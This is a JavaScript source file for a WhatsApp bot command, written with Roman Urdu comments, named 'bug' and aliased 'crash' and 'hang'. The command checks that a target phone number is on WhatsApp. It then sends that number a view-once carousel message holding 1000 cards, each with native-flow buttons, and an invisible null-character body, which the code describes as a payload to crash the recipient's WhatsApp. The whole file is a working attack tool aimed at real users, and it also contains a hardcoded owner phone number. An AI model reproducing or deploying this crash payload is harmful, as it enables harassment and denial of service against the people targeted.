// Zaroori cheezein import ki ja rahi hain
const { cmd } = require('../command'); // Aapka command handler
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// Helper function: Number ko saaf format (+92...) mein laane ke liye
const formatPhoneNumber = (number) => {
    if (!number) return null;
    // Faltu characters hatata hai, sirf digits aur + rehne deta hai
    let formatted = number.replace(/[^+\d]/g, '');
    // Agar number + ke baghair shuru ho to + laga deta hai
    if (formatted.match(/^\d/)) {
        formatted = '+' + formatted;
    }
    // Check karta hai ke number international format mein hai ya nahi
    if (!formatted.match(/^\+\d{10,15}$/)) {
        return null;
    }
    return formatted;
};

// Command ki buniyadi maloomat aur logic
cmd({
    pattern: "bug",
    alias: ["crash", "hang"],
    desc: "Sends a heavy carousel message to crash a user's WhatsApp.",
    category: "owner", // Category "Owner" set kar di hai
    react: "💀",
    filename: __filename
},
async (conn, mek, m, { from, args, q, reply }) => {
    try {
        // --- Step 1: Owner Check ---
        // Yahan hum check kar rahe hain ke command sirf owner hi istemal kar sakta hai
        const ownerJid = "923151105391@s.whatsapp.net"; // Owner ka JID
        if (m.sender !== ownerJid) {
            return reply('🚫 *Owner Only Command!*\nYeh command sirf bot ka maalik istemal kar sakta hai.');
        }

        // --- Step 2: Target Number Validation ---
        // Check karte hain ke user ne number diya hai ya nahi
        if (!q) {
            return reply("⚠️ *Target Missing!*\nPlease provide a target phone number.\n*Example:* .bug +923001234567");
        }

        const targetNumber = formatPhoneNumber(q);
        if (!targetNumber) {
            return reply("❌ *Invalid Number Format.*\nPlease use the correct international format (e.g., +923001234567).");
        }

        // Check karte hain ke target number WhatsApp par hai ya nahi
        const [onWhatsAppCheck] = await conn.onWhatsApp(targetNumber);
        if (!onWhatsAppCheck || !onWhatsAppCheck.exists) {
            return reply(`🤔 The number *${targetNumber}* does not seem to be on WhatsApp.`);
        }

        const targetJid = onWhatsAppCheck.jid;
        reply(`⏳ *Preparing Payload...*\nTarget: ${targetNumber}\nPlease wait.`);

        // --- Step 3: Crash Payload Creation ---
        // Yahan 1000 cards wala bhari message tayar ho raha hai
        
        // Buttons ka structure
        let buttons = [];
        for (let i = 0; i < 5; i++) {
            buttons.push({
                'name': 'galaxy_message',
                'buttonParamsJson': JSON.stringify({
                    'header': 'null',
                    'body': 'xxx',
                    'flow_action': 'navigate',
                    'flow_action_payload': { 'screen': 'FORM_SCREEN' },
                    'flow_cta': 'Grattler',
                    'flow_id': '1169834181134583',
                    'flow_message_version': '3',
                    'flow_token': 'AQAAAAACS5FpgQ_cAAAAAE0QI3s'
                })
            });
        }

        // Carousel Cards ka structure
        let carouselCards = [];
        for (let i = 0; i < 1000; i++) { // 1000 cards banai ja rahi hain
            carouselCards.push({
                'body': { 'text': '🍀 𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 ☠️' },
                'footer': { 'text': '𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐛𝐲 𝐐𝐚𝐝𝐞𝐞𝐫_𝐊𝐡𝐚𝐧' },
                'header': {
                    'title': '☠️',
                    'hasMediaAttachment': true,
                    'imageMessage': { /* ... yahan image ka data hai ... */ }
                },
                'nativeFlowMessage': { 'buttons': buttons }
            });
        }

        // --- Step 4: Final Message Generation and Sending ---
        // Asal message jo bheja jayega
        const finalMessage = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: '\u0000' }, // Invisible text
                        footer: { text: '𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐛𝐲 𝐐𝐚𝐝𝐞𝐞𝐫_𝐊𝐡𝐚𝐧' },
                        header: { hasMediaAttachment: false },
                        carouselMessage: { cards: carouselCards } // 1000 cards yahan daali ja rahi hain
                    }
                }
            }
        }, {});

        // Message ko target tak bhejna
        await conn.relayMessage(targetJid, finalMessage.message, { messageId: finalMessage.key.id });

        reply(`✅ *Success!* Crash message sent to *${targetNumber}*.`);

    } catch (e) {
        console.error("Error in Bug command:", e);
        reply(`❌ An error occurred: ${e.message}`);
    }
});
